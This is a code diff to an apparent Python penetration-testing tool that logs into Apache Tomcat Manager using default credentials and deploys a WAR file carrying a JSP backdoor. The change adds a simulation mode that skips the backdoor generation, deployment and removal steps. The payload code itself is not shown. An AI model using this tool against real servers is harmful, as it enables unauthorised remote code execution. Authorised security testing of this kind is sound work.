@@ -420,6 +420,7 @@ def browseToManager(url, user, password):
             page = browser.open(url + 'html')
             logger.debug('Succeeded, most likely dealing with Tomcat6.')
             error = None
+            url += 'html'
         except urllib2.URLError, e:
             if '403' in str(e):
                 logger.debug('Got 403, most likely dealing with Tomcat6.')
@@ -436,7 +437,7 @@ def browseToManager(url, user, password):
         else:
             logger.error('Browsing to the server (%s) failed: \n\t%s' % (url, e))
 
-        return None
+        return None, None
 
     src = page.read()
 
@@ -444,9 +445,9 @@ def browseToManager(url, user, password):
         logger.debug('Apache Tomcat Manager Application reached & validated.')
     else:
         logger.error('Specified URL does not point at the Apache Tomcat Manager Application')
-        return None
+        return None, None
 
-    return browser
+    return browser, url
 
 def generateRandomPassword(N=12):
     return ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(N))
@@ -464,6 +465,7 @@ Penetration Testing utility aiming at presenting danger of leaving Tomcat miscon
 
     general = optparse.OptionGroup(parser, 'General options')
     general.add_option('-v', '--verbose', dest='verbose', help='Verbose mode.', action='store_true')
+    general.add_option('-s', '--simulate', dest='simulate', help='Simulate breach only, do not perform any offensive actions.', action='store_true')
     general.add_option('-G', '--generate', metavar='OUTFILE', dest='generate', help='Generate JSP backdoor only and put it into specified outfile path then exit. Do not perform any connections, scannings, deployment and so on.')
     general.add_option('-U', '--user', metavar='USER', dest='user', default='tomcat', help='Tomcat Manager Web Application HTTP Auth username. Default="tomcat"')
     general.add_option('-P', '--pass', metavar='PASS', dest='password', default='tomcat', help='Tomcat Manager Web Application HTTP Auth password. Default="tomcat"')
@@ -535,7 +537,7 @@ def main():
 
     if not opts.generate:
         url = 'http://%s%s' % (args[0], opts.url)
-        browser = browseToManager(url, opts.user, opts.password)
+        browser, url = browseToManager(url, opts.user, opts.password)
         if browser == None:
             return
 
@@ -543,7 +545,7 @@ def main():
         appname = opts.appname
         if not opts.remove_appname:
             mode = chooseShellFunctionality(opts)
-            if not opts.file:
+            if not opts.file and not opts.simulate:
                 code = preparePayload(opts)
                 (dirpath, warpath) = generateWAR(code, opts.title, opts.appname)
 
@@ -555,6 +557,8 @@ def main():
                     return
 
             else:
+                if opts.simulate:
+                    logger.info('[Simulation mode] No JSP backdoor generation.')
                 warpath = opts.file
         else:
             appname = opts.remove_appname
@@ -562,20 +566,25 @@ def main():
         if checkIsDeployed(browser, url, appname):
             if opts.remove_appname:
                 logging.info("Removing previously deployed WAR application with name: '%s'" % opts.remove_appname)
-                if removeApplication(browser, url, opts.remove_appname):
-                    logging.info('Succeeded. Hasta la vista!')
+                if not opts.simulate:
+                    if removeApplication(browser, url, opts.remove_appname):
+                        logging.info('Succeeded. Hasta la vista!')
+                    else:
+                        logging.error("Removal failed miserably!")
                 else:
-                    logging.error("Removal failed miserably!")
+                    logger.info('[Simulation mode] No actual JSP removing.')
                 return
 
             logger.warning('Application with name: "%s" is already deployed.' % opts.appname)
-            if opts.unload:
+            if opts.unload and not opts.simulate:
                 logger.debug('Unloading existing one...')
                 if unloadApplication(browser, args[0], opts.appname):
                     logger.debug('Succeeded.')
                 else:
                     logger.debug('Unloading failed.')
                     return
+            elif opts.simulate:
+                logger.info('[Simulation mode] No actual application unloading.')
             else:
                 logger.warning('Not continuing until the application name is changed or current one unloaded.')
                 logger.warning('Please use -x (--unload) option to force existing application unloading.')
@@ -585,6 +594,10 @@ def main():
 
             if opts.remove_appname:
                 return 
+
+        if opts.simulate:
+            logger.info('[Simulate mode] Then it goes for JSP backdoor deployment and the game is over.')
+            return
 
         deployed = deployApplication(browser, url, opts.appname, warpath)
 
